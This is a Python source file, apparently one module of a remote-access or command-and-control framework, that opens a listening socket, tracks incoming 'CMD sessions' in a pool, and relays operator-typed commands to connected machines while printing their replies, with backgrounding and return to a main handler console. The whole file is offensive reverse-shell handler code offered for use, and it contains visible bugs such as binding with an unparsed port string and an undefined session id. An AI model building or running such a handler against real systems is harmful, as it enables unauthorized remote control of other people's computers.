# -*- coding:utf-8 -*-
# @FileName  :cmdshell.py
# @Time      :2022/11/08 18:19:18
# @Author    :D0WE1L1N
# CMDshell库：定义了一个开启cmd远程命令的函数
import socket
import sys
sys.path.append("..")
import random
import main, config_set
try:
    import handler
    import main
except:
    pass
def start(ip, cmd_port, conn, main_port):
    sessions_pool = main.get_value('connect_pool')
    if sessions_pool == None:
        sessions_pool = []
    if cmd_port == "":
        port = 8625
    if ip == "":
        ip = "127.0.0.1"
    else:
        try:
            port = int(cmd_port)
        except:
            main.print_error("handler>[-]port input error")
    try:
        cmd_session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cmd_session.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        cmd_session.bind((ip, cmd_port))
        cmd_session.listen(10)
    except socket.error as msg:
        main.print_error("handler>[-]something went WRONG, print out the wrong msg: " + str(msg))
        sys.exit(1)
    while True:
        cmd_SessObj,addr = cmd_session.accept()
        _ip = addr[0]
        _port = addr[1]
        if not [cmd_SessObj, ip, cmd_port, _ip, _port, 'CMD session'] in sessions_pool:
            sessions_pool.append([cmd_SessObj, ip, cmd_port, _ip, _port, 'CMD session'])
            id = len(sessions_pool)
            main.print_normal(f"CMD_SHELL>[*]CMD session {id} Created:" + ip + ":" + str(cmd_port) + " >>> " + _ip + ":" + str(_port))
        else:
            id = sessions_pool.index([cmd_SessObj, ip, cmd_port, _ip, _port, 'CMD session']) + 1
        cmd_shell(cmd_SessObj, ip, cmd_port, _ip, _port, main_port, conn, cmd_session)
def cmd_shell(cmd_SessObj, ip, cmd_port, _ip, _port, main_port, conn, cmd_session):
    sessions_pool = main.get_value('connect_pool')
    while True:
        try:
            cmd_command = input("CMD_SHELL>")
            cmd_SessObj.send(bytes(cmd_command, 'utf8'))
            if cmd_command == "exit" or cmd_command == "EXIT":
                main.print_normal("CMD_SHELL>[*]exiting......")
                sessions_pool.remove([cmd_SessObj, ip, cmd_port, _ip, _port, 'CMD session'])
                cmd_SessObj.close()
                if cmd_session != None:
                    cmd_session.close()
                if main_port != ' ' and conn != None:
                    conn.recv(1024)
                    handler.PINGPONG_shell(conn, ip, cmd_port, _ip, main_port, False, '')
                else:
                    main.main()
            elif cmd_command == 'bg' or cmd_command == 'BG':
                main.print_normal(f"CMD_SHELL>[*]Backgrounding session {id}")
                main.set_config('connect_pool', sessions_pool)
                if main_port != ' ':
                    conn.recv(1024)
                    handler.PINGPONG_shell(conn, ip, cmd_port, _ip, main_port, False, '')
                else:
                    main.main()
            CMD_re = cmd_SessObj.recv(1024)
            try:
                print(str(ip) + ">"+ CMD_re.decode('utf-8'))
            except:
                print(str(ip) + ">" + CMD_re.decode('gbk'))
        except socket.error:
            main.print_error("CMD_SHELL>[-]CMD session Died, reason: Connection refused")
            main.print_normal("handler>[*]Back to main console......")
            main.main()
